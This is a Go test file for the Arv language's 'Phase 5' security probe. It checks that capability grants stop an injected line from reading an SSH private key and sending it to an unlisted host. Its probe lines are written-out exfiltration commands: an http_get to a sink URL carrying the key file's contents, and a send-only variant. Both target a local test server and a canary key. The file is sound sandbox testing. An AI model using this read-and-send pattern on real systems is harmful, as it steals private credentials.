// Package escape holds the Phase 5 gate's security probe (probe.sh) and
// its tests.
package escape

import (
	"errors"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/delavalom/arvlang/arv"
	"github.com/delavalom/arvlang/arv/runtime"
	"github.com/delavalom/arvlang/bench/farm"
)

// insertAfter is src with line added after the first line that starts,
// leading white space aside, with prefix, as probe.sh's insert does.
func insertAfter(t *testing.T, src, prefix, line string) string {
	t.Helper()
	lines := strings.SplitAfter(src, "\n")
	for i, l := range lines {
		if strings.HasPrefix(strings.TrimLeft(l, " \t"), prefix) {
			return strings.Join(lines[:i+1], "") + line + "\n" + strings.Join(lines[i+1:], "")
		}
	}
	t.Fatalf("no line starts with %q", prefix)
	return ""
}

// The Arv probe, run in process with exactly the gate's grants: the read
// of the key and the send to a host outside the list are both refused
// with capability denied, nothing reaches the sink, and the error does
// not carry the key.
func TestArvProbesAreDenied(t *testing.T) {
	src, err := os.ReadFile("../../examples/uptime.arv")
	if err != nil {
		t.Fatal(err)
	}
	newFarm := func(c farm.Config) (*farm.Farm, *httptest.Server) {
		f, err := farm.New(c)
		if err != nil {
			t.Fatal(err)
		}
		srv := httptest.NewServer(f)
		t.Cleanup(srv.Close)
		return f, srv
	}
	targets, tsrv := newFarm(farm.Config{N: 20, MaxLatency: time.Millisecond, Seed: 1})
	sink, ssrv := newFarm(farm.Config{N: 1})
	dir := t.TempDir()
	key := filepath.Join(dir, "home", ".ssh", "id_ed25519")
	os.MkdirAll(filepath.Dir(key), 0o700)
	const canary = "ARV-ESCAPE-CANARY-in-process"
	os.WriteFile(key, []byte(canary), 0o600)
	os.WriteFile(filepath.Join(dir, "targets.txt"), []byte(targets.TargetList(tsrv.URL)), 0o644)
	os.Mkdir(filepath.Join(dir, "out"), 0o755)
	t.Chdir(dir)
	var caps []runtime.Capability
	for _, g := range []string{"fs_read=targets.txt", "fs_write=out", "net=" + strings.TrimPrefix(tsrv.URL, "http://")} {
		grant, err := runtime.Parse(g, dir)
		if err != nil {
			t.Fatal(err)
		}
		caps = append(caps, grant)
	}
	for name, line := range map[string]string{
		"read and send": `http_get("` + ssrv.URL + `/sink?key=" + read_file("` + key + `"));`,
		"send only":     `http_get("` + ssrv.URL + `/sink?key=stolen");`,
	} {
		probe := insertAfter(t, string(src), "let urls =", line)
		_, err := arv.Run(probe, arv.Options{Caps: caps})
		var ae *arv.Error
		if !errors.As(err, &ae) || ae.Kind != "capability" || !strings.HasPrefix(ae.Msg, "capability denied: ") {
			t.Errorf("%s: %v, want a capability denial", name, err)
		}
		if err != nil && strings.Contains(err.Error(), canary) {
			t.Errorf("%s: the error carries the key: %v", name, err)
		}
		if s := sink.Stats(); s.Sink != 0 || s.Total != 0 {
			t.Errorf("%s: the sink saw %+v", name, s)
		}
	}
}

// probe.sh, end to end: each probe is its program plus one line; the Arv
// probes are denied and send nothing; the Go probe sends the canary.
func TestProbeScript(t *testing.T) {
	if testing.Short() {
		t.Skip("builds the binaries")
	}
	out := t.TempDir()
	cmd := exec.Command("bash", "probe.sh")
	cmd.Env = append(os.Environ(), "BENCH_OUT="+out)
	if b, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("probe.sh: %v\n%s", err, b)
	}
	summary, err := os.ReadFile(filepath.Join(out, "escape", "summary.txt"))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"arv-read-and-send: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0",
		"arv-send-only: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0",
		"go-read-and-send: exit 1, capability denied: no, sink requests: 1,",
	} {
		if !strings.Contains(string(summary), want) {
			t.Errorf("summary lacks %q:\n%s", want, summary)
		}
	}
	for probe, orig := range map[string]string{
		"arv-read-and-send.arv": "../../examples/uptime.arv",
		"arv-send-only.arv":     "../../examples/uptime.arv",
		"go/main.go":            "../uptime-go/main.go",
	} {
		a, _ := os.ReadFile(orig)
		b, _ := os.ReadFile(filepath.Join(out, "escape", probe))
		if n := oneLineAdded(string(a), string(b)); n < 0 {
			t.Errorf("%s is not %s plus one line", probe, orig)
		}
	}
}

// oneLineAdded is the index of the one line b adds to a, or -1 if b is
// not a with exactly one line added.
func oneLineAdded(a, b string) int {
	x, y := strings.Split(a, "\n"), strings.Split(b, "\n")
	if len(y) != len(x)+1 {
		return -1
	}
	for i := range y {
		if strings.Join(append(append([]string{}, y[:i]...), y[i+1:]...), "\n") == a {
			return i
		}
	}
	return -1
}
